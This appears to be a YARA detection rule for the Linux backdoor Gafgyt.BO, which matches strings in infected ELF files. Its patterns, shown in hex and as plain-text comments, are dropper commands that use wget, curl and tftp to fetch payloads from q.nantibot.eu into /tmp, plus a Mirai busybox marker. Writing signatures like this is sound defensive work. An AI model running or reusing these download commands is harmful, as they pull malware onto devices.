
rule Backdoor_Linux_Gafgyt_BO_MTB{
	meta:
		description = "Backdoor:Linux/Gafgyt.BO!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {77 67 65 74 20 68 74 74 70 3a 2f 2f 71 2e 6e 61 6e 74 69 62 6f 74 2e 65 75 2f 62 69 6e 73 2e 73 68 20 2d 4f 20 2f 74 6d 70 2f 62 69 6e 73 2e 73 68 } //1 wget http://q.nantibot.eu/bins.sh -O /tmp/bins.sh
		$a_01_1 = {63 75 72 6c 20 68 74 74 70 3a 2f 2f 71 2e 6e 61 6e 74 69 62 6f 74 2e 65 75 2f 63 75 72 6c 42 69 6e 73 2e 73 68 20 2d 4f 20 2f 74 6d 70 2f 63 75 72 6c 42 69 6e 73 2e 73 68 } //1 curl http://q.nantibot.eu/curlBins.sh -O /tmp/curlBins.sh
		$a_01_2 = {74 66 74 70 20 2d 67 20 2d 72 20 61 72 6d 76 34 6c 20 71 2e 6e 61 6e 74 69 62 6f 74 2e 65 75 } //1 tftp -g -r armv4l q.nantibot.eu
		$a_01_3 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 4d 49 52 41 49 } //1 /bin/busybox MIRAI
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}